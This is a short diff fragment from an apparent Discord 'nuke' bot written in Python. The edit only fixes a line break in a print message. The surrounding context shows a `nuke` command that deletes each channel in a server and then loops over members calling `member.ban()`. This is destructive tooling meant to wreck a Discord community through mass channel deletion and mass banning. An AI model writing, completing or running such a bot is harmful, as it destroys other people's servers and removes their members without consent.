@@ -36,8 +36,8 @@ async def nuke(ctx):
         print(Fore.BLUE + f" [+] {channel.name} Was Deleted." +
 Fore.RESET)
       except:
-        print(Fore.GREEN + f" [-] {channel.name} Was Not 
-Deleted." + Fore.RESET)
+        print(Fore.GREEN + f" [-] {channel.name} Was Not Deleted." +
+Fore.RESET)
     for member in guild.members:
      try:
        await member.ban()
